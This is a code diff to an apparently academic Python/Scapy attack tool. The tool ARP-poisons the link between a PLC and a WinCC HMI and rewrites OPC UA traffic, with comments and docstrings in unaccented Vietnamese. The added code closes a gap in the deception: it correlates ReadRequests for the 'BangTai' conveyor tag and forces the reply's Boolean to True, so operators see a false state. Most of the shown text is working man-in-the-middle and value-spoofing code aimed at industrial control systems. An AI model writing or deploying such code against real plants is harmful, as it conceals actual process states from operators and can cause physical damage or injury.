@@ -30,6 +30,23 @@ Co che cua module nay:
   3. Khi ket thuc cua so STOP (restart that), tat concealment de HMI dong bo
      lai voi trang thai that.
 
+QUAN TRONG -- gateway.py (web_scada/backend/app/opcua/gateway.py) cap nhat
+gia tri tag qua HAI duong doc lap: (a) Subscription/PublishResponse (co
+ClientHandle, minh che duoc qua conceal_bangtai_running), VA (b) mot poll
+loop rieng moi ~1s goi node.read_data_value() cho TUNG tag (_poll_loop /
+_read_tag_once) -- day la ReadRequest/ReadResponse, KHONG co ClientHandle,
+nen khong khop pattern cua conceal_bangtai_running va se lam LO gia tri that
+sau toi da ~1 chu ky poll. Da kiem chung thuc te: nguoi dung bao WinCC chi
+"che" duoc vai giay dau roi tu dong hien lai trang thai dung -- dung khop voi
+co che nay. conceal_bangtai_read_response() + is_bangtai_read_request() ben
+duoi vá lo hong nay bang cach: theo doi khung HMI->PLC co chua chuoi NodeId
+"BangTai" (danh dau "ReadResponse ke tiep tu PLC->HMI la cua BangTai"), roi
+ep gia tri Boolean dau tien trong khung PLC->HMI ke tiep do. Day van la
+heuristic tuong quan theo THU TU GOI TIN (khong parse day du mang NodesToRead
+cua ReadRequest) -- co the sai neu 1 PublishResponse xen vao dung giua cap
+Request/Response do (hiem, nhung khong loai tru), ghi ro de khong phong dai
+muc do chinh xac trong bao cao.
+
 GIOI HAN THAT (khong phong dai, quan trong khi viet bao cao): day la
 concealment o TANG MANG (ARP poison + sua goi tin OPC UA giua PLC va HMI),
 KHONG PHAI code injection vao chinh PLC nhu Stuxnet that (MITRE T0835
@@ -84,6 +101,12 @@ stop_all = threading.Event()
 intercepted_count = 0
 concealed_count = 0
 
+# Correlation flag for the poll-loop leak fix (see module docstring). Only
+# ever touched from inside the single sniff() callback thread, so a plain
+# bool is safe -- packets are processed strictly in arrival order.
+_bangtai_read_pending = False
+BANGTAI_NODEID_MARKER = b"BangTai"
+
 
 def decode_ua_header(raw: bytes):
     if len(raw) < 8:
@@ -135,6 +158,56 @@ def conceal_bangtai_running(payload: bytes) -> bytes:
     return bytes(payload)
 
 
+def is_bangtai_read_request(raw: bytes) -> bool:
+    """HMI->PLC ReadRequest naming BangTai's NodeId. gateway.py's poll loop
+    issues one ReadRequest per tag (not batched), so seeing this string in a
+    request is enough to know the next PLC->HMI ReadResponse on this session
+    is BangTai's single result -- no need to parse the NodesToRead array."""
+    header = decode_ua_header(raw)
+    if not header or header["type"] != "MSG":
+        return False
+    return BANGTAI_NODEID_MARKER in raw
+
+
+def find_first_boolean_dv(body: bytes):
+    """Blind EncodingMask+Boolean-Variant scan -- unsafe in a multi-item
+    Publish frame (see tests/test_mitm_opcua_spoof.py's docstring on why that
+    was replaced by ClientHandle targeting), but safe here because the frame
+    was already correlated to a single-node BangTai ReadRequest, so there is
+    only one DataValue to find. Requires the EncodingMask (Value-present bit
+    set) AND the following Variant TypeId==Boolean(1) as two separate bytes
+    before returning the value at i+2 -- checking only "byte 0x01 followed by
+    0/1" (as a naive scan would) misfires here: EncodingMask=0x01 immediately
+    followed by TypeId=0x01 looks like its own match and points one byte too
+    early, landing on the TypeId byte instead of the value."""
+    for i in range(len(body) - 2):
+        encoding_mask = body[i]
+        variant_type = body[i + 1]
+        if (encoding_mask & 0x01) and variant_type == 0x01:
+            return i + 2
+    return None
+
+
+def conceal_bangtai_read_response(payload: bytes) -> bytes:
+    """Force the sole DataValue of a correlated BangTai ReadResponse to True
+    while concealment is active. Complements conceal_bangtai_running(), which
+    only covers the Publish/subscription path -- see module docstring."""
+    global concealed_count
+    payload = bytearray(payload)
+    header = decode_ua_header(bytes(payload))
+    if not header or header["type"] != "MSG":
+        return bytes(payload)
+    body = payload[8:]
+    offset = find_first_boolean_dv(bytes(body))
+    if offset is None:
+        return bytes(payload)
+    if concealment_active.is_set() and body[offset] != 0x01:
+        body[offset] = 0x01
+        concealed_count += 1
+    payload[8:] = body
+    return bytes(payload)
+
+
 def get_mac(ip, timeout=2):
     try:
         ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=False)
@@ -162,7 +235,7 @@ def restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
 
 
 def mitm_packet_callback(pkt, plc_ip, hmi_ip, iface):
-    global intercepted_count
+    global intercepted_count, _bangtai_read_pending
     if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
         return
     src_ip, dst_ip = pkt[IP].src, pkt[IP].dst
@@ -173,8 +246,13 @@ def mitm_packet_callback(pkt, plc_ip, hmi_ip, iface):
 
     if src_ip == plc_ip and dst_ip == hmi_ip and sport == OPCUA_PORT and pkt.haslayer(Raw):
         raw = bytes(pkt[Raw].load)
+        if _bangtai_read_pending:
+            modified = conceal_bangtai_read_response(raw)
+            _bangtai_read_pending = False
+        else:
+            modified = conceal_bangtai_running(raw)
         new_pkt = pkt.copy()
-        new_pkt[Raw].load = conceal_bangtai_running(raw)
+        new_pkt[Raw].load = modified
         del new_pkt[IP].chksum
         del new_pkt[TCP].chksum
         hmi_mac = getmacbyip(hmi_ip)
@@ -183,6 +261,8 @@ def mitm_packet_callback(pkt, plc_ip, hmi_ip, iface):
         return
 
     if src_ip == hmi_ip and dst_ip == plc_ip:
+        if pkt.haslayer(Raw) and is_bangtai_read_request(bytes(pkt[Raw].load)):
+            _bangtai_read_pending = True
         plc_mac = getmacbyip(plc_ip)
         if plc_mac:
             sendp(Ether(dst=plc_mac) / pkt[IP], iface=iface, verbose=False)
